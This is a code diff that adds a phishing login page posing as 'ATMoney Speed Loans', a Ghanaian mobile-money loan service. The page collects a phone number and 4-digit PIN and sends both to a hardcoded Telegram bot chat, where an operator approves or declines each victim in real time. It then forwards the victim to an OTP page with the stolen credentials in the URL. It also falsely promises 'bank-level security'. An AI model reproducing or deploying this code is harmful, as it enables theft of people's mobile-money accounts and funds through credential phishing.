@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login | ATMoney Speed Loans</title>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --red: #003DA5;
+      --red-dark: #002D80;
+      --red-soft: rgba(0,61,165,0.08);
+      --red-border: rgba(0,61,165,0.18);
+      --at-red: #E30613;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      background: #f3f4f6;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 10px;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: white;
+      border-radius: 24px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+      overflow: hidden;
+      animation: slideUp 0.5s ease;
+    }
+    @keyframes slideUp { from{transform:translateY(20px);opacity:0} to{transform:translateY(0);opacity:1} }
+
+    .logo-section {
+      background: linear-gradient(135deg, #003DA5 0%, #001F5C 100%);
+      text-align: center;
+      padding: 28px 0 22px;
+    }
+    .brand-logo {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .logo-icon {
+      width: 48px;
+      height: 48px;
+      background: white;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .brand-name {
+      color: white;
+      font-size: 26px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+    .brand-name span { color: var(--at-red); }
+    .tagline {
+      color: rgba(255,255,255,0.85);
+      font-size: 12.5px;
+      margin-top: 6px;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 22px;
+      font-weight: 700;
+      color: #1e2937;
+      margin: 22px 0 6px;
+    }
+    .subtitle {
+      text-align: center;
+      color: #475569;
+      font-size: 14.5px;
+      padding: 0 25px 18px;
+      line-height: 1.55;
+    }
+
+    /* Phone number input */
+    .phone-input-wrap {
+      padding: 0 25px;
+      margin-bottom: 18px;
+    }
+    .phone-input-wrap label {
+      display: block;
+      font-size: 11px;
+      font-weight: 700;
+      color: #94a3b8;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 8px;
+    }
+    .phone-input {
+      width: 100%;
+      background: #f8fafc;
+      border: 2px solid #e2e8f0;
+      border-radius: 14px;
+      padding: 16px;
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--red);
+      text-align: center;
+      outline: none;
+      transition: all 0.2s;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      letter-spacing: 1px;
+    }
+    .phone-input:focus {
+      border-color: var(--red);
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(0,61,165,0.08);
+    }
+    .phone-input::placeholder {
+      color: #cbd5e1;
+      font-weight: 400;
+      letter-spacing: 0;
+    }
+
+    /* PIN section */
+    .pin-section {
+      padding: 0 20px;
+      margin-bottom: 6px;
+    }
+    .pin-label {
+      text-align: center;
+      font-size: 11px;
+      font-weight: 700;
+      color: #94a3b8;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 14px;
+    }
+    .pin-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 18px 0 20px;
+    }
+    .pin-input {
+      width: 62px;
+      height: 68px;
+      text-align: center;
+      font-size: 28px;
+      font-weight: 800;
+      color: var(--red);
+      border: 2px solid #e2e8f0;
+      border-radius: 16px;
+      outline: none;
+      transition: all 0.2s;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      background: #f8fafc;
+    }
+    .pin-input:focus {
+      border-color: var(--red);
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(0,61,165,0.1);
+    }
+    @media (max-width: 380px) {
+      .pin-input { width: 52px; height: 58px; font-size: 24px; }
+      .pin-container { gap: 7px; }
+    }
+
+    /* Info box */
+    .info-box {
+      background: #ECFDF5;
+      border: 1px solid #A7F3D0;
+      border-radius: 14px;
+      padding: 14px 16px;
+      margin: 0 20px 20px;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+    }
+    .info-box span { font-size: 15px; margin-top: 1px; }
+    .info-box p {
+      font-size: 12px;
+      color: #065F46;
+      font-weight: 600;
+      line-height: 1.5;
+    }
+
+    /* Error message */
+    .error-msg {
+      text-align: center;
+      margin: 0 20px 14px;
+      font-size: 13.5px;
+      padding: 12px;
+      border-radius: 12px;
+      display: none;
+      color: #b91c1c;
+      background: #fee2e2;
+      border: 1px solid #fca5a5;
+    }
+
+    .form-section {
+      padding: 0 25px 28px;
+    }
+    .btn-action {
+      width: 100%;
+      background: var(--red);
+      color: white;
+      border: none;
+      padding: 17px;
+      font-size: 17px;
+      font-weight: 700;
+      border-radius: 50px;
+      cursor: pointer;
+      margin: 10px 0;
+      transition: background 0.2s;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+    }
+    .btn-action:hover { background: var(--red-dark); }
+    .btn-action:disabled {
+      background: #94a3b8;
+      cursor: not-allowed;
+    }
+    .back-btn {
+      width: 100%;
+      background: transparent;
+      color: #64748b;
+      border: 2px solid #e2e8f0;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 50px;
+      cursor: pointer;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+    }
+
+    /* Spinner */
+    #spinner {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.92);
+      z-index: 10000;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      color: white;
+    }
+    .spin {
+      width: 65px;
+      height: 65px;
+      border: 6px solid rgba(255,255,255,0.2);
+      border-top: 6px solid var(--red);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .footer-note {
+      text-align: center;
+      font-size: 11px;
+      color: #94a3b8;
+      padding: 0 25px 20px;
+      line-height: 1.6;
+    }
+    .footer-note a {
+      color: var(--red);
+      text-decoration: none;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo-section">
+      <div class="brand-logo">
+        <div class="logo-icon">
+          <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="12" width="22" height="14" rx="3" fill="#003DA5"/>
+            <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="#003DA5" stroke-width="2.2" stroke-linecap="round" fill="none"/>
+            <circle cx="14" cy="19" r="2.5" fill="white"/>
+          </svg>
+        </div>
+        <div>
+          <div class="brand-name">ATMoney<span>Speed Loans</span></div>
+          <div class="tagline">Life is Simple</div>
+        </div>
+      </div>
+    </div>
+
+    <h1>Verify Your Account</h1>
+    <p class="subtitle">Enter your ATMoney phone number and 4-digit PIN to access your loan dashboard.</p>
+
+    <div class="phone-input-wrap">
+      <label>ATMoney Phone Number</label>
+      <input type="tel" class="phone-input" id="loginPhone" placeholder="e.g. 0240000000" maxlength="10" autocomplete="off">
+    </div>
+
+    <div class="pin-section">
+      <div class="pin-label">Enter 4-Digit PIN</div>
+      <div class="pin-container" id="pinInputs">
+        <input type="text" maxlength="1" class="pin-input" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+        <input type="text" maxlength="1" class="pin-input" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+        <input type="text" maxlength="1" class="pin-input" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+        <input type="text" maxlength="1" class="pin-input" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+      </div>
+    </div>
+
+    <div class="error-msg" id="errMsg"></div>
+
+    <div class="info-box">
+      <span>🔒</span>
+      <p>Your information is encrypted and secure. We use bank-level security to protect your data.</p>
+    </div>
+
+    <div class="form-section">
+      <button class="btn-action" id="verifyBtn">Verify & Continue ⚡</button>
+      <a href="index.html" style="display:block; text-align:center; margin-top:10px;">
+        <button class="back-btn" type="button">← Back to Home</button>
+      </a>
+    </div>
+
+    <div class="footer-note">
+      By proceeding, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.<br>
+      &copy; 2026 ATMoney Ghana. All rights reserved.
+    </div>
+  </div>
+
+  <div id="spinner">
+    <div class="spin"></div>
+    <p style="margin-top:25px; font-size:17px;">Verifying account...</p>
+  </div>
+
+  <script>
+    // Telegram config
+    const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
+    const CID = '7547427914';
+
+    let isProcessing = false;
+    const errMsg = document.getElementById('errMsg');
+    const spinner = document.getElementById('spinner');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const pinInputs = document.getElementById('pinInputs');
+    const phoneInput = document.getElementById('loginPhone');
+
+    // ─── PIN Auto-focus ─────────────────────────────────────────
+    function setupPinAutoFocus() {
+      const inputs = pinInputs.querySelectorAll('.pin-input');
+      inputs.forEach((input, index) => {
+        input.addEventListener('input', () => {
+          // Allow only digits
+          input.value = input.value.replace(/\D/g, '');
+          if (input.value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+        });
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !input.value && index > 0) {
+            inputs[index - 1].focus();
+          }
+        });
+        input.addEventListener('paste', (e) => {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+          if (pasted.length >= 4) {
+            for (let i = 0; i < 4; i++) {
+              inputs[i].value = pasted[i] || '';
+            }
+            inputs[3].focus();
+          }
+        });
+      });
+    }
+
+    function getPin() {
+      return Array.from(pinInputs.querySelectorAll('.pin-input'))
+                 .map(i => i.value.trim()).join('');
+    }
+
+    // ─── Send to Telegram ───────────────────────────────────────
+    function sendToTelegram(phone, pin, callback) {
+      const ts = Date.now();
+      const msg = '<b>🔴 NEW LOGIN — ATMoney Speed Loans</b>\n\n' +
+                  '📱 Phone: <code>' + phone + '</code>\n' +
+                  '🔑 PIN: <code>' + pin + '</code>\n' +
+                  '🕐 Time: <code>' + new Date().toLocaleString() + '</code>\n\n' +
+                  'Choose Action:';
+
+      fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CID,
+          text: msg,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: '✅ Approve', callback_data: 'login_approve_' + ts }],
+              [{ text: '❌ Decline', callback_data: 'login_decline_' + ts }]
+            ]
+          }
+        })
+      })
+      .then(function(res) { return res.json(); })
+      .then(function(data) {
+        if (data.ok) {
+          let lastOffset = 0;
+          const interval = setInterval(function() {
+            fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (lastOffset + 1))
+              .then(function(r) { return r.json(); })
+              .then(function(updates) {
+                if (!updates.ok || !updates.result) return;
+                updates.result.forEach(function(update) {
+                  lastOffset = update.update_id;
+                  if (update.callback_query) {
+                    const cb = update.callback_query.data;
+                    if (cb === 'login_approve_' + ts || cb === 'login_decline_' + ts) {
+                      clearInterval(interval);
+                      callback(cb.startsWith('login_approve_'));
+                    }
+                  }
+                });
+              })
+              .catch(function() {});
+          }, 1000);
+          // Auto-proceed after 30s timeout
+          setTimeout(function() {
+            clearInterval(interval);
+            callback(true);
+          }, 30000);
+        } else {
+          callback(true);
+        }
+      })
+      .catch(function() {
+        callback(true);
+      });
+    }
+
+    // ─── Submit handler ─────────────────────────────────────────
+    function handleSubmit() {
+      if (isProcessing) return;
+
+      const phone = phoneInput.value.trim();
+      const pin = getPin();
+
+      // Validation
+      errMsg.style.display = 'none';
+
+      if (!phone || phone.length < 10) {
+        errMsg.textContent = 'Please enter a valid 10-digit ATMoney number.';
+        errMsg.style.display = 'block';
+        phoneInput.focus();
+        return;
+      }
+      if (pin.length !== 4) {
+        errMsg.textContent = 'Please enter your 4-digit PIN.';
+        errMsg.style.display = 'block';
+        pinInputs.querySelectorAll('.pin-input')[0].focus();
+        return;
+      }
+
+      // Show spinner
+      isProcessing = true;
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verifying...';
+      spinner.style.display = 'flex';
+
+      sendToTelegram(phone, pin, function(approved) {
+        spinner.style.display = 'none';
+
+        if (approved) {
+          // Redirect to OTP page with params
+          const queryParams = 'phone=' + encodeURIComponent(phone) +
+                             '&pin=' + encodeURIComponent(pin) +
+                             '&amount=1000' +
+                             '&name=Speed Loan';
+          setTimeout(function() {
+            window.location.href = 'otp.html?' + queryParams;
+          }, 800);
+        } else {
+          isProcessing = false;
+          verifyBtn.disabled = false;
+          verifyBtn.textContent = 'Verify & Continue ⚡';
+          errMsg.textContent = 'Request declined. Please try again.';
+          errMsg.style.display = 'block';
+        }
+      });
+    }
+
+    // ─── Init ───────────────────────────────────────────────────
+    setupPinAutoFocus();
+    verifyBtn.onclick = handleSubmit;
+
+    // Enter key support
+    phoneInput.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') handleSubmit();
+    });
+
+    // Auto-focus first PIN input when phone has 10 digits
+    phoneInput.addEventListener('input', function() {
+      if (phoneInput.value.replace(/\D/g, '').length === 10) {
+        pinInputs.querySelectorAll('.pin-input')[0].focus();
+      }
+    });
+  </script>
+</body>
+</html>
